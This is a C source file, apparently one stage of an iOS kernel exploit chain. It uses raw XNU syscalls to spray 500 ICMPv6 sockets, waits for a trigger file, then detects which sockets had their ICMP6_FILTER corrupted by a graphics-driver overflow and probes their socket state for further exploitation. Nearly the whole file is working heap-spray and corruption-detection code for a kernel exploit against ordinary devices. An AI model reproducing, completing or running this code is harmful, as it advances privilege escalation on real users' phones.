// darksword_detect.c — ICMPv6 socket spray with corruption detection
// Build: zig cc -target aarch64-macos -O2 darksword_detect.c -o darksword_detect
// Or: GitHub Actions macOS runner with clang -arch arm64

#define AF_INET6 30
#define SOCK_DGRAM 2
#define SOCK_RAW 3
#define IPPROTO_ICMPV6 58
#define ICMP6_FILTER 18
#define IPV6_RECVPKTINFO 61
#define NUM_SOCKETS 500
#define TRIGGER_PATH "/var/mobile/Media/DCIM/nexus_trigger"
#define RESULTS_PATH "/var/mobile/Media/DCIM/nexus_results"
#define STATUS_PATH  "/var/mobile/Media/DCIM/nexus_status"

// ICMPv6 types
#define ICMP6_ECHO_REQUEST 128
#define ICMP6_ECHO_REPLY 129

// Syscall numbers (XNU ARM64)
#define SYS_SOCKET    97
#define SYS_BIND      104
#define SYS_SETSOCKOPT 105
#define SYS_GETSOCKOPT 118
#define SYS_SENDTO    133
#define SYS_RECVFROM  29
#define SYS_CLOSE     6
#define SYS_OPEN      5
#define SYS_READ      3
#define SYS_WRITE     4
#define SYS_STAT      338
#define SYS_NANOSLEEP 240
#define SYS_SELECT    93
#define SYS_FCNTL     92
#define SYS_CONNECT   98

// open flags
#define O_RDONLY   0x0000
#define O_WRONLY   0x0001
#define O_CREAT    0x0200
#define O_TRUNC    0x0400
#define O_RDWR     0x0002
#define O_NONBLOCK 0x0004

// fcntl
#define F_GETFL 3
#define F_SETFL 4

typedef unsigned long size_t;
typedef long ssize_t;

// Raw syscall wrappers
static long sys2(long n, long a, long b) {
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x16) : "memory");
    return x0;
}
static long sys3(long n, long a, long b, long c) {
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x16) : "memory");
    return x0;
}
static long sys5(long n, long a, long b, long c, long d, long e) {
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x16) : "memory");
    return x0;
}
static long sys6(long n, long a, long b, long c, long d, long e, long f) {
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e;
    register long x5 __asm__("x5") = f;
    register long x16 __asm__("x16") = n;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5), "r"(x16) : "memory");
    return x0;
}

// Helper: write string to file
static void write_file(const char *path, const char *data, int len) {
    long fd = sys3(SYS_OPEN, (long)path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        sys3(SYS_WRITE, fd, (long)data, len);
        sys2(SYS_CLOSE, fd, 0);
    }
}

// Helper: check if file exists
static int file_exists(const char *path) {
    char statbuf[256]; // stat struct
    return sys2(SYS_STAT, (long)path, (long)statbuf) == 0;
}

// Helper: int to decimal string
static int itoa(int val, char *buf) {
    if (val == 0) { buf[0] = '0'; return 1; }
    int neg = 0;
    if (val < 0) { neg = 1; val = -val; }
    char tmp[12];
    int len = 0;
    while (val > 0) { tmp[len++] = '0' + (val % 10); val /= 10; }
    int pos = 0;
    if (neg) buf[pos++] = '-';
    for (int i = len - 1; i >= 0; i--) buf[pos++] = tmp[i];
    return pos;
}

// Helper: sleep N seconds
static void sleep_sec(int sec) {
    struct { long s; long ns; } ts = {sec, 0};
    sys3(SYS_NANOSLEEP, (long)&ts, 0, 0);
}

// IPv6 sockaddr for loopback
struct sockaddr_in6 {
    unsigned char sin6_len;      // 1
    unsigned char sin6_family;   // 1 (AF_INET6=30)
    unsigned short sin6_port;    // 2
    unsigned int sin6_flowinfo;  // 4
    unsigned char sin6_addr[16]; // 16 (::1 for loopback)
    unsigned int sin6_scope_id;  // 4
}; // total 28 bytes

// ICMPv6 echo request header
struct icmp6_echo {
    unsigned char type;    // 128 = echo request
    unsigned char code;    // 0
    unsigned short cksum;  // 0 (kernel computes)
    unsigned short id;     // identifier
    unsigned short seq;    // sequence
};

int main(void) {
    // Phase 1: Create sockets with ICMP6_FILTER blocking echo request (type 128)
    int fds[NUM_SOCKETS];
    int created = 0;

    // ICMP6_FILTER: 256 bits (32 bytes). Bit N set = block type N.
    // We set ALL bits (block everything), then clear type 129 (echo reply) to allow it
    // Actually: set all bits = PASS all. icmp6_filter semantics:
    //   ICMP6_FILTER_SETBLOCKALL = all 0xFF = block all
    //   ICMP6_FILTER_SETPASSALL  = all 0x00 = pass all
    // We want to BLOCK type 128 (echo request) specifically:
    //   Start with PASSALL (0x00), then SETBLOCK type 128
    //   Bit 128 = byte 16, bit 0 → set byte[16] |= 1
    unsigned char filter[32];
    // BLOCK ALL first
    for (int i = 0; i < 32; i++) filter[i] = 0xFF;

    for (int i = 0; i < NUM_SOCKETS; i++) {
        long fd = sys3(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        if (fd >= 0) {
            sys5(SYS_SETSOCKOPT, fd, IPPROTO_ICMPV6, ICMP6_FILTER, (long)filter, 32);

            // Set non-blocking for later detection
            long flags = sys3(SYS_FCNTL, fd, F_GETFL, 0);
            sys3(SYS_FCNTL, fd, F_SETFL, flags | O_NONBLOCK);

            fds[created] = (int)fd;
            created++;
        }
    }

    // Write initial status
    char status[128];
    int slen = 0;
    char *s = "READY:";
    for (int i = 0; s[i]; i++) status[slen++] = s[i];
    slen += itoa(created, status + slen);
    status[slen++] = '\n';
    write_file(STATUS_PATH, status, slen);

    // Phase 2: Poll for trigger file
    while (1) {
        if (file_exists(TRIGGER_PATH)) {
            break;
        }
        sleep_sec(1);
    }

    // Phase 3: Test each socket for filter corruption
    // If AGX overflow zeroed the icmp6_filter, the filter bytes become 0x00 = PASS ALL
    // We test by reading the filter back via getsockopt
    int corrupted_count = 0;
    int corrupted_fds[64]; // store up to 64 corrupted fd indices
    char results[4096];
    int rlen = 0;

    s = "SCAN_START\n";
    for (int i = 0; s[i]; i++) results[rlen++] = s[i];

    for (int i = 0; i < created && rlen < 3800; i++) {
        // Read current filter via getsockopt
        unsigned char cur_filter[32];
        int optlen = 32;
        long ret = sys5(SYS_GETSOCKOPT, fds[i], IPPROTO_ICMPV6, ICMP6_FILTER,
                        (long)cur_filter, (long)&optlen);

        if (ret < 0) {
            // getsockopt failed — socket might be corrupted at struct level
            results[rlen++] = 'E';
            rlen += itoa(i, results + rlen);
            results[rlen++] = ':';
            rlen += itoa((int)ret, results + rlen);
            results[rlen++] = '\n';
            if (corrupted_count < 64) corrupted_fds[corrupted_count++] = i;
            continue;
        }

        // Check if filter was zeroed (all bytes = 0 means PASS ALL)
        int zeroed = 1;
        int changed = 0;
        for (int j = 0; j < 32; j++) {
            if (cur_filter[j] != 0) zeroed = 0;
            if (cur_filter[j] != filter[j]) changed = 1;
        }

        if (zeroed) {
            // FILTER ZEROED — cross-zone corruption confirmed!
            results[rlen++] = 'Z'; // Zeroed
            rlen += itoa(i, results + rlen);
            results[rlen++] = ':';
            results[rlen++] = 'f';
            results[rlen++] = 'd';
            results[rlen++] = '=';
            rlen += itoa(fds[i], results + rlen);
            results[rlen++] = '\n';
            if (corrupted_count < 64) corrupted_fds[corrupted_count++] = i;
        } else if (changed) {
            // Filter partially changed — also corruption
            results[rlen++] = 'C'; // Changed
            rlen += itoa(i, results + rlen);
            results[rlen++] = ':';
            // Write first 8 bytes of filter as hex
            for (int j = 0; j < 8; j++) {
                char hex[] = "0123456789abcdef";
                results[rlen++] = hex[cur_filter[j] >> 4];
                results[rlen++] = hex[cur_filter[j] & 0xF];
            }
            results[rlen++] = '\n';
            if (corrupted_count < 64) corrupted_fds[corrupted_count++] = i;
        }
        // else: filter unchanged = OK, skip
    }

    // Summary
    s = "DONE:corrupted=";
    for (int i = 0; s[i]; i++) results[rlen++] = s[i];
    rlen += itoa(corrupted_count, results + rlen);
    s = ",total=";
    for (int i = 0; s[i]; i++) results[rlen++] = s[i];
    rlen += itoa(created, results + rlen);
    results[rlen++] = '\n';

    write_file(RESULTS_PATH, results, rlen);

    // Phase 4: If corrupted sockets found, attempt further probing
    if (corrupted_count > 0) {
        // Probe corrupted socket: try getsockopt on other options
        // to check if in6pcb struct is also corrupted
        char probe[2048];
        int plen = 0;
        s = "PROBE_START\n";
        for (int i = 0; s[i]; i++) probe[plen++] = s[i];

        for (int c = 0; c < corrupted_count && c < 8 && plen < 1800; c++) {
            int idx = corrupted_fds[c];
            int fd = fds[idx];

            probe[plen++] = 'P';
            plen += itoa(idx, probe + plen);
            probe[plen++] = ':';

            // Try reading IPV6_RECVPKTINFO — reveals pcb state
            int val = 0;
            int vlen = 4;
            long r = sys5(SYS_GETSOCKOPT, fd, 41/*IPPROTO_IPV6*/, IPV6_RECVPKTINFO,
                          (long)&val, (long)&vlen);
            probe[plen++] = 'r';
            probe[plen++] = '=';
            plen += itoa((int)r, probe + plen);
            probe[plen++] = ',';
            probe[plen++] = 'v';
            probe[plen++] = '=';
            plen += itoa(val, probe + plen);

            // Try reading SO_TYPE — reveals socket struct state
            int sotype = 0;
            int stlen = 4;
            r = sys5(SYS_GETSOCKOPT, fd, 0xFFFF/*SOL_SOCKET*/, 0x1008/*SO_TYPE*/,
                     (long)&sotype, (long)&stlen);
            probe[plen++] = ',';
            probe[plen++] = 't';
            probe[plen++] = '=';
            plen += itoa(sotype, probe + plen);

            // Try reading SO_ERROR
            int soerr = 0;
            int selen = 4;
            r = sys5(SYS_GETSOCKOPT, fd, 0xFFFF, 0x1007/*SO_ERROR*/,
                     (long)&soerr, (long)&selen);
            probe[plen++] = ',';
            probe[plen++] = 'e';
            probe[plen++] = '=';
            plen += itoa(soerr, probe + plen);

            probe[plen++] = '\n';
        }

        s = "PROBE_DONE\n";
        for (int i = 0; s[i]; i++) probe[plen++] = s[i];

        // Append to results
        long fd = sys3(SYS_OPEN, (long)RESULTS_PATH, O_WRONLY | O_CREAT, 0644);
        if (fd >= 0) {
            // Seek to end — use lseek syscall 199
            register long x0 __asm__("x0") = fd;
            register long x1 __asm__("x1") = 0;
            register long x2 __asm__("x2") = 2; // SEEK_END
            register long x16 __asm__("x16") = 199; // lseek
            __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x16) : "memory");
            sys3(SYS_WRITE, fd, (long)probe, plen);
            sys2(SYS_CLOSE, fd, 0);
        }
    }

    // Keep alive forever
    while (1) {
        sleep_sec(60);
    }
    return 0;
}
